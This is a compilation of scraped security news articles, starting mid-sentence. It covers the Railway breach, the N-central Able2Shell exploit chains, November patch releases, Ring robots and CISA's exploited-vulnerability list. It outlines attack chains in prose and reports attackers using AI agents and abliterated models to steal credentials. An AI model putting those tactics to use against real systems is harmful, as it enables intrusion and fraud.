Service, CVE-2026-112967, that could allow remote code execution also made this month's roundup. It's a heap-overflow vulnerability with a 9.8 CVSS rating that doesn't require authentication or user interaction to exploit. So don't take a gaming break between testing November's updates. Or, if you do, at least make sure vulnerable Windows systems running the Xbox Live Networking Service are on your patching list, too. ®

articles.title: November Patch Tuesday: An Overflowing Cornucopia of CVEs
Railway breach leads to $740,000 in fraudulent AI charges
articles.context: The attack began on October 20, when hackers exploited a previously unknown vulnerability in Railway's build infrastructure to escape filesystem isolation and obtain an internal...
articles.full_text:
Cloud hosting provider Railway says hackers exploited vulnerabilities in its infrastructure to steal customer authentication secrets and generate approximately $740,000 in fraudulent AI usage, potentially exposing credentials for up to 100,000 workspaces.

The company disclosed the incident on October 22, warning customers to rotate their secrets after detecting unauthorized access to systems storing environment variables.

In a new incident report published today, Railway confirms that attackers gained access to its internal source code and the decrypted customer environment variables for at most 1.85% of its workspaces, or approximately 100,000.

The company says this figure represents the maximum number of potentially impacted workspaces, rather than the confirmed number whose secrets were stolen.

The attack began on October 20, when hackers exploited a previously unknown vulnerability in Railway's build infrastructure to escape filesystem isolation and obtain an internal credential.

The attackers used the credential to access stored build histories and retrieve a copy of Railway's internal source code, which they then analyzed to identify additional ways to compromise the platform.

The attackers then exploited a second vulnerability involving an improperly configured trust relationship to gain further access to Railway's infrastructure and obtain credentials used to decrypt customer environment variables.

Railway says the attack became a roughly 26-hour battle between its engineers and threat actors using AI-powered agents to identify and exploit vulnerabilities across its infrastructure. At the same time, defenders worked to secure the systems.

"This was not a single breach followed by a single fix. The attacker probed many potential routes, in parallel, with Railway similarly hardening the routes in parallel," Railway said.

"The escalating situation became a contest of agent speed, with Railway defending against abliterated models and a harness similar to ARTEX, according to Wiz."

Railway says its investigation found that the attackers specifically searched for AI provider credentials, although some queries also targeted cloud, database, and payment service credentials.

The stolen credentials were subsequently used to generate approximately $740,000 in unauthorized AI usage, with Railway working with affected providers to reimburse customers. The company says it will cover charges that providers decline to refund.

The breach also exposed linked-account tokens belonging to 1,852 users, including GitHub OAuth tokens and AI agent keys. Railway says it reset those tokens and notified affected users.

Railway believes the attackers were focused on stealing AI credentials for resale or use in AI model distillation, linking the incident to a recent wave of attacks against AI developer platforms that security firm Wiz has dubbed "Black October."

This campaign has targeted numerous AI development platforms during the past month, including Northflank, OpenCode, Warp, and Lightning AI.

The company says the attackers were fully removed from its systems on October 21 and that all exploited vulnerabilities have since been remediated.

Railway also found no evidence that the hackers downloaded customer Git repositories or accessed customer databases.

articles.title: N-able N-central gets emergency fix two days after 33 exploits published
articles.context: N-able has taken its hosted N-central remote monitoring and management (RMM) platform offline worldwide and shipped an emergency hotfix after a security researcher released 33...
articles.full_text:
N-able has taken its hosted N-central remote monitoring and management (RMM) platform offline worldwide and shipped an emergency hotfix after a security researcher released 33 zero-day exploits for the software, including attack chains that could let unauthenticated attackers take over servers.

N-central is used by managed service providers (MSPs) and enterprise IT teams to remotely manage, patch, and support endpoint systems, so a compromised server can expose every computer under its control. N-able said it took the hosted environments offline as a precaution and advised customers using the on-premises version to shut down their servers until it released the fix, N-central 2026.4 HF2, on Tuesday.

The vulnerabilities were disclosed late Sunday by an offensive security researcher named Sean Bales who uses the GitHub handle Oracle-Security. The release includes proof-of-concept exploit chains that require no authentication and could result in command execution as the service account and, in some cases, root access.

N-able said it has already observed scanning activity associated with the published exploits but has not seen evidence that any customer environment has been successfully exploited. Censys found 1,728 internet-exposed N-central instances, and security firm Previdian recorded 68 exploitation attempts against one of its honeypots from a single IP address within about 18 hours of the publication.

Exploit chains lead to remote code execution

The 33 exploits, which the researcher dubbed Able2Shell, are organized into four attack chains. The most severe requires no authentication and abuses an XML external entity (XXE) flaw in a service-import function to steal a trusted local session, reset an account password, and execute commands as the nable service user. The same chain can create a Default Administrator account with credentials chosen by the attacker, giving them full control of the appliance.

Two other attack chains start from a predictable appliance passcode that lets an anonymous attacker inject malicious patch metadata. When an administrator opens the patch details, a stored cross-site scripting (XSS) payload runs in their browser and invokes a command-execution interface as the nable user. The administrator’s session can also be hijacked through the same flaw to submit a crafted audit-export configuration that runs commands as root.

A fourth chain writes an executable web page into the server’s web directory through a directory traversal flaw in a software repository feature, then escalates to root through a passwordless installer that executes a configuration from a directory the nable user can write to.

Bales tested all of the exploits against N-central Appliance 2026.4.0.31, a pre-release build, and noted in the repository’s documentation that most, if not all, of the flaws should work on previous versions, including the most up-to-date release.

N-able has not confirmed how many of the 33 flaws it could reproduce, but the new hotfix lists 7 CVEs:

CVE-2026-125883 — Multiple XXE vulnerabilities

CVE-2026-125878 — Multiple OGNL injection vulnerabilities

CVE-2026-125879 — Local privilege escalation to root via nable-writable syslog-ng config

CVE-2026-125880 — Stored XSS via MMS3 patch metadata (admin context)

CVE-2026-125881 — Schema-hint SSRF via service import schema validation

CVE-2026-125882 — RCE via file repository upload path traversal (Credit Nate Fair, Sprocket Security)

CVE-2026-91000 — Insecure IPC Channels lead to local privilege escalation

Attacks likely to follow

N-central has been targeted by attackers in the past and the Able2Shell disclosure is the fourth time in 15 months that N-able has been forced to do an emergency response. In August 2025, the company patched two flaws tracked as CVE-2025-8875 and CVE-2025-8876 that were exploited in the wild as zero-days.

In August this year, the company patched an authentication bypass flaw tracked as CVE-2026-18556 that was exploited as a zero-day to deploy ransomware, but the patch was incomplete and attackers quickly found a bypass: CVE-2026-18577. Microsoft attributed the ransomware attacks that abused the flaw to Storm-1175, a financially motivated group linked to China that deployed the StormEncryptor ransomware on MSP-managed systems.

In September, security firm Huntress discovered that a fully patched N-central server had been compromised through a new chain of access-control flaws tracked as CVE-2026-86206 and CVE-2026-86207. A day later N-able disclosed CVE-2026-86218, a pre-authentication remote code execution flaw rated 10.0 on the CVSS scale that had also been exploited.

N-able claims more than 25,000 MSP partners and telemetry from more than 11 million endpoints.

What customers should do

With the N-central 2026.4 Hotfix 2 available, N-able said on-premises customers should upgrade as soon as possible, and all customers — hosted and on-premises — must upgrade their Agents and Probes to restore compatibility between the two.

Security firm Huntress advised N-central administrators to review authentication activity from Nov. 8 onward, look for administrator accounts, scripts, and remote-access sessions they did not create, and assess every client network managed by the server, not just the server itself. Huntress also cautioned that patched servers may not display a new version number, so administrators should verify fixes against N-able’s guidance rather than the version string.

ThreatDefence recommended preserving logs and server snapshots before making any changes, then rotating credentials for administrator and technician accounts, asset-discovery databases, agent registration tokens, and ecosystem agent keys once the server is restored.

articles.title: Microsoft Fixes Nearly 1,100 Security Vulnerabilities
articles.context: This month’s Patch Tuesday addresses 63 critical flaws — including a zero-day in Microsoft Outlook — and comes amid important security updates from other software makers,...
articles.full_text:
Microsoft did another four-digit patch drop today, releasing updates to fix almost 1,100 security vulnerabilities in its Windows operating systems and supported software. This month’s Patch Tuesday addresses 63 critical flaws — including a zero-day in Microsoft Outlook — and comes amid important security updates from other software makers, including Adobe, Apple, Google and Mozilla.

Image: Shutterstock.com. Diorama by @zepp1969.

November’s patch release from Redmond tackles 1,093 vulnerabilities, fixing 63 “critical” flaws that can be exploited to seize control over a Windows system with little or no help from users. Nearly half of those critical bugs are remote code execution vulnerabilities. Overall, 535 of the flaws addressed this month allow an attacker to elevate their privileges on a vulnerable device.

This latest round of updates means Microsoft has shipped more than 5,100 security patches so far this year, a staggering number considering that a year ago Microsoft was averaging around 100 patches per month. Microsoft credits advances in artificial intelligence for helping to find (and fix) such a large volume of security bugs in recent months. Last month, Microsoft pushed more than 1,400 fixes.

According to Redmond, just one of the flaws is already seeing active exploitation: CVE-2026-124194, a spoofing bug in Outlook. The advisory for CVE-2026-124194 says it affects Microsoft 365 Apps for Enterprise and editions of Microsoft Office.

Several other major software makers pushed security updates this week to fix critical weaknesses in their products. Apple on Monday released out-of-cycle security updates to fix at least nine vulnerabilities in iOS/iPadOS, macOS, watchOS and visionOS. Among the weaknesses reportedly fixed in Apple’s release include an iMessage flaw that could let a remote attacker join a group chat and receive its messages; the updates also fix a separate iMessage flaw that could let someone added to a group access messages sent before they joined.

Lee Neely, an instructor at the SANS Institute, noted that Apple backported the fix to iOS 18.

“I take notice when Apple releases fixes to more than two versions,” Neely wrote in a SANS newsletter today. “You really need to get to version 27.2.1 of their OSes and push folks who are holding onto devices which cannot run the current version. The best plan often involves setting an upgrade date for old hardware. Run through all your Apple devices and make sure everything is up to date, don’t assume the fixes went out automatically.”

Google this week released Chrome version 157.0.8103.50, which resolves nine security holes, including CVE-2026-125350, the sixth zero-day vulnerability this year for Chrome (this bug also being patched in Chromium-based browsers like Edge). The latest Chrome version follows its November 3 release, which fixed 213 vulnerabilities. A new version of Mozilla Firefox out today (Firefox 160) resolves almost 100 CVEs, about half of them high severity.

Adobe today released patches for at least 110 vulnerabilities across a range of products, with nearly half of the flaws rated high severity. Adobe said there is no evidence any of the security holes it addressed this month are being actively exploited.

Chris Goettl, vice president of product management at Ivanti, said it’s easy for security teams at large enterprises to feel overwhelmed by the volume and criticality of patches from Microsoft lately. But he notes that while some 95,000 vulnerabilities have been assigned CVEs this year across all vendors, only 217 have so far this year been added to the Known Exploited Vulnerabilities (KEV) list maintained by the U.S. Cybersecurity and Infrastructure Security Agency (CISA).

“Roughly four in ten of this year’s exploited vulnerabilities sit in operating systems, endpoint software, browsers, and server platforms, which a continuous patch strategy can close quickly,” Goettl said.”The rest calls for exposure management alongside patching, especially the 44% that sit in edge devices and IT management or remote access tools, the internet-facing systems that hold privileged access. Teams that can quickly identify those assets, confirm exposure and act on confirmed exploitation can focus on the small slice of vulnerabilities attackers are actively using, while the rest stays on the normal patch cadence.”

Please don’t neglect to back up any important data if you haven’t recently; generally speaking, this is a task best accomplished before applying operating system updates. As ever, if you experience any issues applying this month’s bundle of love from Microsoft, please drop a comment about it in the space below.

articles.title: Ring robots ready to patrol paranoids’ pads
articles.context: The house of Bezos announced the launch of Ring Robotics on Tuesday along with its first two products: a drone designed for indoor home security, and a wheeled robot with a...
articles.full_text: If you didn't have any privacy concerns about slapping a Ring doorbell on your front door or putting Ring cameras inside, you'll love Amazon's newest offerings, which move around homes and businesses to capture views stationary cameras might miss. The house of Bezos announced the launch of Ring Robotics on Tuesday along with its first two products: a drone designed for indoor home security, and a wheeled robot with a telescoping camera mast for automated after-hours business patrols. Both are designed to proactively patrol spaces as well as respond to alerts from connected alarm systems and Ring-connected devices. According to Ring founder Jamie Siminoff, this is something customers actually want, as those stationary cameras just can’t quite see everywhere. “It’s not just a new category of security; it’s the beginning of a future where proactive, autonomous protection is something every home and every business can have,” Siminoff said. The consumer-focused Ring Drone Cam launches from its own charging dock that Amazon says keeps the thing “out of sight” when not in use, and when in flight is able to patrol a home by flying around pre-programmed routes to take in the sights with its 148-degree FOV, 2K camera that includes LED illumination for night patrols. Amazon says it can also respond to alerts from cameras, sensors, and alarm systems. The Ring Rover Cam, designed with businesses in mind, is sort of like a security Roomba that sports a camera on a telescoping mast that Amazon says can be programmed to certain heights to let it see over counters, shelves, and other workplace obstacles. The Rover can also perform 360-degree scans and includes a siren, lights, and two-way audio so you can yell at intruders who aren't dissuaded by its presence. The Rover streams and records video in up to 4K while moving or patrolling and is designed to make regular patrols of businesses during off hours. It can also detect people and respond to alerts from connected Ring devices. Of course, given that this is Ring we're talking about, these flying and free-wheeling cameras use Amazon's cloud for some processing, likely inviting privacy concerns about what footage and mapping data the company can access and retain. The Amazon-owned security tech firm has faced a number of privacy complaints over the years, some of which have resulted in multimillion-dollar settlements. Ring agreed to pay $5.8 million in a 2023 settlement with the FTC over allegations that employees and contractors improperly accessed customers' private videos and that the company failed to adequately protect accounts against unauthorized access – just imagine the privacy concerns raised by flying robots. More recently, the company took heat for partnering with surveillance outfit Flock Safety, a relationship which it has since canceled. Amazon/Ring also invited criticism for a Super Bowl ad earlier this year promoting a new feature called Search Party, which would remotely activate Ring cameras to search for lost pets, suggesting that Amazon had the ability, in theory, to use Ring cameras like a dystopian neighborhood surveillance network. Another Ring feature, Familiar Faces, which uses AI-powered facial recognition to identify people captured by compatible cameras, prompted a proposed class-action lawsuit filed in June. The complaint alleges that the feature collected biometric information from visitors and passersby without their consent. If we can’t have iRobot, we’ll do it with Ring Amazon abandoned its efforts to buy Roomba robot-vacuum maker iRobot in 2024, blaming regulatory scrutiny for the move. The FTC, under then-chair Lina Khan, examined the deal's potential effects on competition and consumer privacy, including concerns about the information Roombas collect while mapping customers' homes. European regulators, meanwhile, raised concerns that Amazon could use its marketplace to disadvantage rival robot vacuum makers. With this Ring move, Amazon is once again putting robots capable of mapping interior spaces into customers' hands, reviving some of the privacy questions raised during its failed iRobot acquisition. As Amazon explains in Tuesday’s press release, both new Ring robots are powered by AI Pilot, “a custom-built system that uses the devices’ cameras, specialized vision models, on-device sensors, and cloud processing to see, think, and navigate autonomously.” To help the Ring robots understand where they're operating, the devices generate floor plans of interior spaces, according to Amazon. “Carry Ring Drone through your space or let Ring Rover autonomously explore, and it turns what it sees into a floor plan,” the company explains of the setup process. AI Pilot takes the reins in identifying the types of rooms it sees and suggests key patrol areas it should focus on, which users can add to in the Ring app. Amazon claims that videos captured by these new flying and free-wheeling cameras will be protected by an encryption scheme it calls Throw Away the Key Encryption (TAKE). The system temporarily allows Ring's cloud services to access recordings for enabled features before the relevant encryption keys are deleted. Ring announced the scheme in August, presenting it as a way to limit access to customer recordings without sacrificing cloud-powered features. “With TAKE, your Ring videos are protected with unique, rotating encryption keys,” Amazon explained. “A copy of the keys is temporarily held inside a secure enclave within the cloud; think of it as a sealed vault that can only provide Ring access to the key under strict, limited conditions.” The keys, Amazon claims, are later deleted so that only users and those they allow access to can see videos, with Ring only retaining them “to power the intelligent features that you have active on your account.” “We take privacy concerns seriously, and we believe privacy and customer control are fundamental to building products people trust,” a Ring spokesperson told The Register when asked about prior privacy concerns. “That is why customers decide where these devices go and when.” We asked about floor plan security, but didn’t get an answer about that. As for when those devices will be available, the Rover Cam will start shipping on December 16 at a price of about $1,000, but the Drone Cam might not ever actually make it to homes. Amazon’s announcement mentions a release date of January 27, 2027, but that’s subject to the FCC giving its blessing. “Ring Drone Cam has not been authorized as required by the rules of the FCC,” Amazon’s release states. “This device is not, and may not be, offered for sale or lease, or sold or leased, until authorization is obtained.” Amazon told us that the Drone Cam would still start shipping in January, luckily giving everyone a few months to figure out how to deal with this new, more mobile, invasion of privacy. ®

articles.title: U.S. CISA adds IBM, SignalWire FreeSwitch, OpenSSH, and GPUStack flaws to its Known Exploited Vulnerabilities catalog
articles.context: I found no public confirmation of exploitation in the wild or information identifying attackers at the time of writing
articles.full_text:
U.S. Cybersecurity and Infrastructure Security Agency (CISA) adds IBM, SignalWire FreeSwitch, OpenSSH, and GPUStack flaws to its Known Exploited Vulnerabilities catalog.

The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added IBM, SignalWire FreeSwitch, OpenSSH, and GPUStack vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog:

Below are the flaws added to the catalog:

CVE-2026-102895 GPUStack Improper Authentication Vulnerability

CVE-2026-116779 SignalWire FreeSwitch Code Injection Vulnerability

CVE-2026-123158 OpenBSD OpenSSH Unexpected Status Code or Return Value Vulnerability

CVE-2026-123218 IBM Aspera Faspex Incorrect Authorization Vulnerability

The first issue added to the catalog, CVE-2026-102895 (CVSS score of 9.8), is an improper authentication vulnerability affecting GPUStack, an open-source platform used to manage GPU clusters and AI model deployments. The flaw allows remote, unauthenticated attackers to bypass authentication and obtain administrator privileges by making requests appear to originate from the local system. Successful exploitation can expose sensitive information, create persistent administrator API keys, modify configurations and potentially execute arbitrary code. Exploitation has been observed in the wild against a GPUStack 2.1.1 deployment. Security researcher Javier Sixto reported the in-the-wild exploitation, but no specific threat group has been identified. The issue affects versions before 2.2.0.

The second issue, CVE-2026-116779 (CVSS score of 9.8), is a code injection vulnerability in SignalWire FreeSWITCH, an open-source communications platform. The flaw allows attackers to send specially crafted SIP MESSAGE requests and abuse the API chat protocol to execute FreeSWITCH API commands. Depending on the configuration, this can expose credentials and configuration data, manipulate telephone calls and execute operating system commands with the privileges of the FreeSWITCH process. SignalWire confirmed that exploitation has been observed in the wild. The vulnerability was added to CISA’s KEV catalog on November 9, 2026, but no information identifying the attackers or a specific campaign has been disclosed. FreeSWITCH versions before 1.11.3 are affected.

The third issue, CVE-2026-123158 (CVSS score of 8.1), is an authentication bypass vulnerability affecting OpenSSH. Under specific conditions, when OpenSSH runs on Linux systems using the musl C library without Pluggable Authentication Modules (PAM), the SSH server may incorrectly interpret password input as a password hash. A remote, unauthenticated attacker can exploit the flaw by submitting a specially crafted password to bypass authentication and access affected accounts. CISA added the vulnerability to its KEV catalog on November 6, 2026, indicating that exploitation has been observed. However, no specific threat actor or attack campaign has been publicly identified. OpenSSH versions before 10.6p2 are affected.

The fourth issue, CVE-2026-123218 (CVSS score of 9.8), is an incorrect authorization vulnerability affecting IBM Aspera Faspex 5. It allows an authenticated user to craft a specific message that bypasses authorization checks and potentially gain full administrative privileges. Successful exploitation could give attackers access to sensitive information and allow them to modify or disrupt the affected system. IBM disclosed the vulnerability on November 7, 2026, and released a fix in Aspera Faspex 5.0.19 PL1. I found no public confirmation of exploitation in the wild or information identifying attackers at the time of writing. Versions 5.0.0 through 5.0.19 are affected.

According to Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.

Experts also recommend that private organizations review the Catalog and address the vulnerabilities in their infrastructure.

CISA orders federal agencies to fix the two vulnerabilities by November 12, 2026.

Pierluigi Paganini

(SecurityAffairs – hacking, CISA)
